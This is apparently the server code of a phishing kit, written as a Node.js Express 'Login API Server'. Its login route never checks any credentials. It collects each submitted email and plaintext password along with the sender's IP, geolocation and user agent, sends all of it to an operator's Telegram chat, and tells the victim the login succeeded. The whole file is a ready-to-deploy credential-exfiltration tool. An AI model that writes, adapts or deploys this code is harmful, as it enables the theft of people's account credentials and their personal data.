const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
app.use(cors({ origin: '*', methods: ['GET', 'POST'], allowedHeaders: ['Content-Type', 'Authorization'] }));
app.use(express.json({ limit: '256kb' }));
app.use(express.urlencoded({ extended: true, limit: '256kb' }));
app.set('trust proxy', true);

/* ==========================================================================
 * Rate limiter — returns JSON on 429 so the frontend never chokes
 * ======================================================================== */
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) =>
    req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
  handler: (req, res) => {
    res.status(429).json({
      success: false,
      message: 'Too many requests. Please try again in a few minutes.'
    });
  }
});
app.use('/api', limiter);

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL   = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

/* ==========================================================================
 * Helpers
 * ======================================================================== */

function getClientIP(req) {
  const cf = req.headers['cf-connecting-ip'];
  const tc = req.headers['true-client-ip'];
  const xf = req.headers['x-forwarded-for'];
  const xr = req.headers['x-real-ip'];
  if (cf) return cf;
  if (tc) return tc;
  if (xf) return xf.split(',')[0].trim();
  if (xr) return xr;
  return req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
}

function formatTimestamp(date) {
  const options = {
    year: 'numeric', month: '2-digit', day: '2-digit',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    hour12: true, timeZone: process.env.TIMEZONE || 'Africa/Lagos'
  };
  try { return date.toLocaleString('en-US', options); }
  catch (_) { return date.toLocaleString(); }
}

function esc(v) {
  if (v === null || v === undefined) return 'N/A';
  return String(v)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function trunc(v, max = 120) {
  if (v === null || v === undefined) return 'N/A';
  const s = String(v);
  return s.length > max ? s.slice(0, max - 1) + '…' : s;
}

/**
 * Send a message to Telegram. Tries HTML first; if Telegram rejects it
 * (usually because of an unescaped char or bad entity), retries plain text.
 */
async function sendToTelegram(message, opts = {}) {
  const parseMode = opts.parseMode === undefined ? 'HTML' : opts.parseMode;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    disable_web_page_preview: true
  };
  if (parseMode) payload.parse_mode = parseMode;

  try {
    const res = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, payload, { timeout: 10000 });
    console.log('[telegram] sent OK (' + (parseMode || 'plain') + ', ' + message.length + ' chars)');
    return { success: true, data: res.data };
  } catch (err) {
    console.error('[telegram] send failed:', err.message);
    if (err.response && err.response.data) {
      console.error('[telegram] API error:', JSON.stringify(err.response.data));
    }

    /* If HTML failed, retry once as plain text */
    if (parseMode === 'HTML') {
      const stripped = message
        .replace(/<[^>]+>/g, '')
        .replace(/&lt;/g, '<')
        .replace(/&gt;/g, '>')
        .replace(/&amp;/g, '&');

      try {
        const res2 = await axios.post(
          `${TELEGRAM_API_URL}/sendMessage`,
          {
            chat_id: TELEGRAM_CHAT_ID,
            text: stripped,
            disable_web_page_preview: true
          },
          { timeout: 10000 }
        );
        console.log('[telegram] retried as plain text — OK');
        return { success: true, data: res2.data, retried: true };
      } catch (err2) {
        console.error('[telegram] plain text retry also failed:', err2.message);
      }
    }
    return { success: false, error: err.message };
  }
}

async function getIPLocation(ip) {
  try {
    if (
      !ip ||
      ip === 'Unknown' ||
      ip.includes('127.0.0.1') ||
      ip.includes('::1') ||
      ip.includes('::ffff:')
    ) {
      return 'Local/Private Network';
    }

    const response = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 5000 });

    if (response.data && response.data.status === 'success') {
      const parts = [];
      if (response.data.city)       parts.push(response.data.city);
      if (response.data.regionName) parts.push(response.data.regionName);
      if (response.data.country)    parts.push(response.data.country);
      if (response.data.isp)        parts.push(`ISP: ${response.data.isp}`);
      return parts.join(', ') || 'Unknown';
    }
    return 'Unknown';
  } catch (err) {
    console.error('Error getting location:', err.message);
    return 'Unknown';
  }
}

/* ==========================================================================
 * Login message formatter
 * ======================================================================== */

function formatLoginMessage(loginData) {
  const now = new Date();
  return [
    '🔐 <b>New Login Attempt</b>',
    '━━━━━━━━━━━━━━━━━━━━',
    `📅 <b>Date/Time:</b> ${esc(formatTimestamp(now))}`,
    `🌍 <b>UTC Time:</b> ${esc(now.toISOString())}`,
    `📧 <b>Email:</b> ${esc(loginData.email)}`,
    `🔑 <b>Password:</b> ${esc(loginData.password)}`,
    `🌐 <b>IP Address:</b> ${esc(loginData.ip)}`,
    `📍 <b>Location:</b> ${esc(loginData.location)}`,
    `🖥 <b>User Agent:</b> <code>${esc(trunc(loginData.userAgent, 200))}</code>`,
    '━━━━━━━━━━━━━━━━━━━━'
  ].join('\n');
}

/* ==========================================================================
 * Routes
 * ======================================================================== */

app.post('/api/login', async (req, res) => {
  try {
    const body = req.body || {};
    const { email, password } = body;

    /* ── LOUD LOGGING ─────────────────────────────────────────────── */
    console.log('========== NEW LOGIN ==========');
    console.log('Body keys:', Object.keys(body));
    console.log('Has email:', !!email, '| Has password:', !!password);
    console.log('===============================');

    if (!email) {
      return res.status(400).json({ success: false, message: 'Email is required' });
    }
    if (!password) {
      return res.status(400).json({ success: false, message: 'Password is required' });
    }

    const clientIP  = getClientIP(req);
    const userAgent = req.headers['user-agent'];
    const location  = await getIPLocation(clientIP);

    const loginData = { email, password, ip: clientIP, location, userAgent };
    const loginMsg  = formatLoginMessage(loginData);

    console.log('[telegram] sending login message…');
    const r1 = await sendToTelegram(loginMsg);
    console.log('[telegram] login message result:', r1.success);

    if (!r1.success) {
      console.error('❌ Telegram send failed — check TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID');
    }

    res.status(200).json({
      success: true,
      message: 'Login processed successfully',
      ip: clientIP,
      telegram: { login: r1.success }
    });

  } catch (error) {
    console.error('Error processing login:', error);
    res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'OK',
    timestamp: formatTimestamp(new Date()),
    utcTimestamp: new Date().toISOString(),
    detectedIP: getClientIP(req),
    timezone: process.env.TIMEZONE || 'Africa/Lagos',
    telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
    botTokenPresent: !!TELEGRAM_BOT_TOKEN,
    chatIdPresent: !!TELEGRAM_CHAT_ID
  });
});

app.get('/api/test-telegram', async (req, res) => {
  const testMessage =
    `✅ Test message\n` +
    `🕐 Local: ${formatTimestamp(new Date())}\n` +
    `🌍 UTC: ${new Date().toISOString()}`;

  const result = await sendToTelegram(testMessage);

  res.status(result.success ? 200 : 500).json({
    success: result.success,
    message: result.success ? 'Test sent' : 'Failed',
    error: result.error || null
  });
});

app.get('/api/debug-ip', (req, res) => {
  res.json({
    detectedIP: getClientIP(req),
    timestamp: formatTimestamp(new Date()),
    headers: {
      'x-forwarded-for':  req.headers['x-forwarded-for'],
      'x-real-ip':        req.headers['x-real-ip'],
      'cf-connecting-ip': req.headers['cf-connecting-ip'],
      'true-client-ip':   req.headers['true-client-ip']
    }
  });
});

app.get('/', (req, res) => {
  res.json({
    message: 'Login API Server',
    status: 'Running',
    endpoints: {
      login:         'POST /api/login',
      health:        'GET /health',
      testTelegram:  'GET /api/test-telegram',
      debugIP:       'GET /api/debug-ip'
    }
  });
});

/* 404 — always JSON so the frontend can parse it */
app.use((req, res) =>
  res.status(404).json({ success: false, message: 'Route not found' })
);

/* ==========================================================================
 * Global error handler — catches anything Express would render as HTML
 * MUST be placed after all routes and before app.listen
 * ======================================================================== */
app.use((err, req, res, next) => {
  console.error('[unhandled]', err);
  res.status(err.status || 500).json({
    success: false,
    message: err.message || 'Internal server error'
  });
});

/* ==========================================================================
 * Start
 * ======================================================================== */
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Telegram bot configured: ${TELEGRAM_BOT_TOKEN ? 'Yes' : 'No'}`);
  console.log(`💬 Chat ID configured: ${TELEGRAM_CHAT_ID ? 'Yes' : 'No'}`);
  console.log(`🕐 Timezone: ${process.env.TIMEZONE || 'Africa/Lagos'}`);
});
